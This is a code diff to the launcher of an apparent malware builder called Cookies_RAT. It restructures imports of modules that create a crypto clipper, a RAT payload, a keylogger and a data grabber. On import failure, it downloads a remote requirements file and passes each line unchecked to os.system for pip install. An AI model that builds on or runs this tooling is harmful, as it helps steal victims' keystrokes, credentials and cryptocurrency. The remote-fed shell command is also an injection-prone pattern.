@@ -1,12 +1,37 @@
-from colorama import Fore
-from util.plugins.common import *
-from cookies_package import *
-from time import sleep
+'''
+Try importing modules
+'''
+try: 
+    from colorama import Fore
+    from util.plugins.common import *
+    from cookies_package import *
+    from time import sleep
 
-from util.create_crypto_clipper import Create_Crypto_Clipper
-from util.create_payload import CookiesRAT
-from util.create_key_logger import Create_KeyLogger
-from util.create_data_grabber import Create_Data_Grabber
+    from util.create_crypto_clipper import Create_Crypto_Clipper
+    from util.create_payload import CookiesRAT
+    from util.create_key_logger import Create_KeyLogger
+    from util.create_data_grabber import Create_Data_Grabber
+    
+    from assets.modules import *
+except:
+    clear() # Clear screen to fix color issues
+    '''
+    Attempt to download each module 1 by 1
+    '''
+    r = requests.get("https://raw.githubusercontent.com/Callumgm/Cookies_RAT/master/requirements.txt").text
+    for i in r.splitlines():
+        try:
+            os.system(f"pip install {i}")
+        except:
+            print(f"{Fore.LIGHTRED_EX}Failed to import module{Fore.RESET}{i}")
+            pass
+    
+    clear()
+    print(f"{Fore.LIGHTRED_EX}If no modules failed to installed please run the setup.bat again, if this problem persists contact CookiesKush420{Fore.RESET}")
+    input("\n\nPress enter to exit...")
+    exit()
+
+
 
 
 
@@ -85,26 +110,4 @@ def main_menu():
 
 
 if __name__ == "__main__":
-    '''
-    Try importing modules
-    '''
-    try: from assets.modules import *
-    except:
-        clear() # Clear screen to fix color issues
-        '''
-        Attempt to download each module 1 by 1
-        '''
-        r = requests.get("https://raw.githubusercontent.com/Callumgm/Cookies_RAT/master/requirements.txt").text
-        for i in r.splitlines():
-            try:
-                os.system(f"pip install {i}")
-            except:
-                print(f"{Fore.LIGHTRED_EX}Failed to import module{Fore.RESET}{i}")
-                pass
-        
-        clear()
-        print(f"{Fore.LIGHTRED_EX}If no modules failed to installed please run the setup.bat again, if this problem persists contact CookiesKush420{Fore.RESET}")
-        input("\n\nPress enter to exit...")
-        exit()
-    
     main_menu()
